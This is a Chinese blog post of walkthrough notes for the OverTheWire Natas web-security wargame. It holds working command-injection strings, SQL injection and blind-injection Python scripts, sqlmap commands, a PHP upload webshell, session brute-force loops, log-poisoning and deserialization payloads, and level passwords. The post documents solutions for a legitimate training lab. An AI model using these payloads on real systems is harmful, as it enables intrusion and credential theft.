---
layout: default
title: overthewire_wargames_notes_natas
categories:
- C++
tags:
- C++
---
//Description: overthewire 上的练习，学习web-security

//Create Date: 2020-03-24 10:53:23

//Author: channy

# overthewire_wargames_notes_natas

[address](https://overthewire.org/wargames/natas/)

[reference](https://blog.csdn.net/winkar/article/details/38620401)

[reference1-26](https://www.cnblogs.com/ichunqiu/p/9554885.html)

## 1. <!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->

![natas1](./natas/natas1.png)

## 2. （常用的查看源码方法：右键查看、F12查看元素，给页面url前加’view-source:’查看，使用Linux Curl命令查看）

<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->

![natas2](./natas/natas2.png)

## 3. 同目录权限问题，水平越权

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

![natas3](./natas/natas3.png)
![natas3-1](./natas/natas3-1.png)
![natas3-2](./natas/natas3-2.png)

## 4. robots协议也叫robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。

访问目录下的robots.txt,得目录/s3cr3t/,访问该目录，得users.txt

```
//robots.txt
User-agent: *
Disallow: /s3cr3t/

//users.txt
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

## 5. curl命令

```
C:\Users\channy>curl -isu natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ natas4.natas.labs.overthewire.org --referer "http://natas5.natas.labs.overthewire.org/"
HTTP/1.1 200 OK
Date: Wed, 26 Feb 2020 11:54:41 GMT
Server: Apache/2.4.10 (Debian)
Vary: Accept-Encoding
Content-Length: 962
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```

![natas5-1](./natas/natas5-1.png)

## 6. cookies有个logined值为0，改成1即可。

chrome可用扩展Editthiscookie

```
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
``` 

或者用
```
curl -isu natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq natas5.natas.labs.overthewire.org --cookie "loggedin=1"
```

![natas6-1](./natas/natas6-1.png)
![natas6-2](./natas/natas6-2.png)

## 7. 头文件

View sourcecode
```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "<censored>" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">

<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

```
//http://natas6.natas.labs.overthewire.org/includes/secret.inc
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

```
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

## 8> https://www.segmentfault.com<img src="x" onerror="alert(1)">. http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

```
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

```
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```

![natas8](./natas/natas8.png)

## 9. 

source code

```
...
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

可用在线工具直接运行php
```php
<?php
echo base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")))
?>
```

得secret: oubWYf2kBq

```
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```

## 10. 

source code
```
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>
```

注入

> needle;cat /etc/natas_webpass/natas10

```
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
...
```

## 11.

source code
```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

grep正则查找

> [a-zA-Z] /etc/natas_webpass/natas11

```
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

## 12. 

source code

```
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>
```

cookie上的data("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw")经过加密，

```
<?php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
$data= 'ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw';
function xor_encrypt($in,$out) {
    $key ='' ;
    $text = $in;
    for($i=0;$i<strlen($text);$i++) {
    $key .= $text[$i] ^ $out[$i];
    }
    return $key;
}
 echo xor_encrypt(json_encode($defaultdata),base64_decode($data)); 
?>
//得到key: qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
<?php
$defaultdata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';
 
    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }
    return $outText;
}
//得到新data: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
```

The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

## 13.

source code
```
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```

通过抓包可以分析出来服务端是以filename字段的后缀名来存储文件的，那么我们直接修改后缀为.php，即可成功上传文件，访问之即可获得natas13密码

jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

## 14. php.exif_imagetype

source code
```
...
if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
    
    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```

测试上传发现过滤，exif_imagetype()函数，用于检验文件是否是图片，读取一个图像的第一个字节并检查其签名，只要在php文件最前面加上图片信息签名即可绕过。

```
GIF89a
 
<?php
system('cat /etc/natas_webpass/natas14');
?>
```

Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

## 15.

```
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>
```

可以看到此处直接将输入参数username和password值拼接进SQL语句执行，那么肯定存在SQL注入了
username填入admin" or 1=1#，password填入1(随便都可以)
获得natas15密码

AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

## 16. sqlmap自动化注入

```
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>
```

```python
# -*- coding: UTF-8 -*-
import requests

url='http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/index.php'

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

filtered = ''

passwd = ''

for char in chars:
    Data = {'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
    #使用like模糊查询不会区分大小写，要带上binary
    r = requests.post(url=url,data=Data)
    if 'exists' in r.text :
        filtered = filtered + char
        print filtered #先过滤出密码里存在的字符，然后再跑具体的值，这样能加快速度

for i in range(0,32):
    for char in filtered:
        Data = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
        #使用like模糊查询不会区分大小写，要带上binary
        r = requests.post(url=url,data=Data)
        if 'exists' in r.text :
            passwd = passwd + char
            print(passwd)
            break

```

或
```python
python sqlmap.py -u "http://natas15.natas.labs.overthewire.org/index.php" --auth-type=basic --auth-cred=natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J  --dbms=mysql --data username=natas16 --level=5 --risk=3 --technique=B --dump --string="This user exists"
```

考查SQL注入漏洞，但这次需要盲注处密码的值，需要写盲注脚本，虽然sql语句中只查询了username字段来判断用户是否存在，这里我们直接猜测用户natas16是存在的，再使用and逻辑运算将对password字段的查询连接起来，构成布尔注入语句，使用like模糊查询，最终得到密码

> WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

## 17.

```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

```
$(grep a /etc/natas_webpass/natas17)Africans
如果密码文件里首字母是`a`外层就是aAfricans，输出結果dictionary.txt就会找不到
如果密码文件里首字母不是`a`外层就是Africans，输出結果就是dictionary.txt找到Africans
```

我们知道dictionary.txt中存在的字符串，比如说Africans，用它与$(grep)的返回值相加，如果内层返回了结果将检索出空值，如果返回空值则外层的grep会返回结果，比如：
password中首字母为a，构造出语句
grep -I "$(grep a /etc/natas_webpass/natas17)Africans" dictionary.txt
由于内部的$()命令返回了a，则使外层命令变为
grep -I "aAfricans" dictionary.txt
由于dictionary中没有aAfricans，从而返回空值
而如果内层$()命令返回空值，外层则能正确检索到Africans，于是返回值，证明首字母不是a
在此思路上我们来构造命令盲注脚本

```python
import requests
url = "http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/"
key = ''
char = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
while len(key) < 32:
    for i in range(len(char)):
        payload = {'needle':'$(grep ^'+key+char+'.* /etc/natas_webpass/natas17)wrong','submit':'Search'}
        req = requests.get(url=url,params=payload)
        if 'wrong' not in req.text:
            key += char
    print key
```

```python
# -*- coding: UTF-8 -*-

import requests  

from requests.auth import HTTPBasicAuth  
  
auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')  
  
filteredchars = ''  

passwd = ''  

allchars = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'  

for char in allchars:  

 r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=$(grep ' + char + ' /etc/natas_webpass/natas17)Africans', auth=auth)  
   
 if 'Africans' not in r.text:  

  filteredchars = filteredchars + char  

  print(filteredchars)  
  
for i in range(32):  

 for char in filteredchars:  

  r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=$(grep ^' + passwd + char + ' /etc/natas_webpass/natas17)Africans', auth=auth)  
    
  if 'Africans' not in r.text:  

   passwd = passwd + char  

   print(passwd)  

   break
```

> 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

## 18.

```
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>
```

这一题依然是考查SQL注入漏洞，不过显然比之前的题目更难了点：因为没有任何回显
所以这次我需要通过sleep()进行延时盲注
输入：natas18" and sleep(5) #
服务端构造的SQL语句：SELECT * from users where username="natas18" and sleep(5) #

```python
import requests
[/color] [color=Black]
url = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/index.php'
key =''
 
for i in range(1,33):
    a = 32
    c = 126
    while a<c:
        b = (a+c)/2
        payload=r'natas18" and if(%d<ascii(mid(password,%d,1)),sleep(2),1) and "" like "'%(b,i)
        try:
            req = requests.post(url=url,data={"username":payload},timeout=2)
        except requests.exceptions.Timeout,e:
            a=b+1
            b=(a+c)/2
            continue
        c=b
    key +=chr(b)
    print key
```

```python
import requests 
 
from requests.auth import HTTPBasicAuth  
  
Auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')  
headers = {'content-type': 'application/x-www-form-urlencoded'}  
filteredchars = ''  
passwd = ''  
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'  
  
for char in allchars:  
        payload = 'username=natas18" and password like binary \'%{0}%\' and sleep(5) #'.format(char)  
        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=Auth, data=payload, headers=headers)  
        if(r.elapsed.seconds >= 1):  
                filteredchars = filteredchars + char  
                print(filteredchars)  
  
print(filteredchars)  
  
for i in range(0,32):  
        for char in filteredchars:  
                payload = 'username=natas18" and password like binary \'{0}%\' and sleep(5) #'.format(passwd + char)  
                r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=Auth, data=payload, headers=headers)  
                if(r.elapsed.seconds >= 3):  
                        passwd = passwd + char  
                        print(passwd)  
                        break
```

xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

## 19.


此题是考查SessionID伪造漏洞

通过BurpSuite-Intruder Attack模块设置字典1-640进行暴力破解

```sh
#!/bin/sh

for i in `seq 640` 
do
    echo $i
    curl -isu natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP http://natas18.natas.labs.overthewire.org/  --cookie "PHPSESSID=$i" | grep natas19
done
```

当PHPSESSID=138时，获得natas19密码

4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

## 20.

随便输入username和password，抓包观察PHPSESSID，发现是输入的信息，按照password-username的格式，由ascill码转化为16进制，猜测正确PHPSESSID，应该是id-admin，用python构造字典，burp抓包后使用intruder模块，导入字典后进行暴力破解。

```sh
#!/bin/sh

#for i in `seq 37 39`
#do
    #for j in `seq 30 39`
    #do
        #for k in `seq 30 39`
        #do
            #echo $i  $j  $k

            i=35
            j=30
            k=31
            #echo "PHPSESSID=${i}${j}${k}2d61646d696e"
            curl -isu  natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs http://natas19.natas.labs.overthewire.org --cookie "PHPSESSID=${i}${j}${k}2d61646d696e" | grep -A 3 "natas20"
        #done
    #done
#done
```

当PHPSESSID=38392d61646d696e时，得到key。
Key：eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

## 21.
 
由于服务端对sessionID进行了合法性校验，因此无法直接通过修改PHPSESSID来读取密码文件的信息
但username没有任何校验，因此可以在其中注入\nadmin 1使读取的时候对Session进行间接篡改

```
curl -isu natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF http://natas20.natas.labs.overthewire.org -d "name=head > admin 1"
```

IFekPyrQXftziDEsUr3x21sYuahypdgJ

## 22.

```
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
/* }}} */

session_start();
print_credentials();
```

```
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}
```

```
curl -isu natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ http://natas21-experimenter.natas.labs.overthewire.org -d "submit=update" -d "admin=1"
```

得PHPSESSID=ia4mr6isorpqdhltm0nli58or1

同上一题得

chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ

23. 

```
curl -isu natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ http://natas22.natas.labs.overthewire.org?revelio=1
```

```
You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
```

24. 一要求提交的参数中含有iloveyou，二要求它大于10.考验的是php的字符串向数字的转换规则，即截取最前几个数字，舍去不符合格式的部分。

```
if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
```

```
curl -isu natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE http://natas23.natas.labs.overthewire.org -F "passwd=11iloveyou"

...
Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
```

25. strcmp无法比较数组

```
if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
```

```
curl -isu natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg http://natas24.natas.labs.overthewire.org -F "passwd[]=1"

...
<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />
<br>The credentials for the next level are:<br><pre>Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c</pre> 
```

26. if是一次性把所有符合的替换掉，构造复合的参数即可绕过，例如：....//、..././。

```
curl -isu natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c natas25.natas.labs.overthewire.org -d "lang=..././..././..././..././..././tmp/natas25_6u790jr22d4ou5ilfmv4gh2423.log"  --user-agent "<?passthru(\"cat /etc/natas_webpass/natas26\")?>"

...
oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
```

27. php反序列化漏洞、代码审计

```
<?php
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
        function __construct(){   #注入信息
            $this->initMsg="";
            $this->exitMsg="<?echo include '/etc/natas_webpass/natas27';?>";
            $this->logFile="img/aaa.php";
        }
}
 
$test = new Logger();
echo serialize($test);
echo "\n";
echo base64_encode(serialize($test));    #显示base64编码后的序列化字符串
?>
```

本地执行，得到base64编码后的序列化字符串：
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMToiaW1nL2FhYS5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czowOiIiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo0NjoiPD9lY2hvIGluY2x1ZGUgJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jzs/PiI7fQ==
把字符串覆盖到cookie[drawing]中，访问../img/aaa.php即可得到key。
Key:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ

28. 


[back](/)

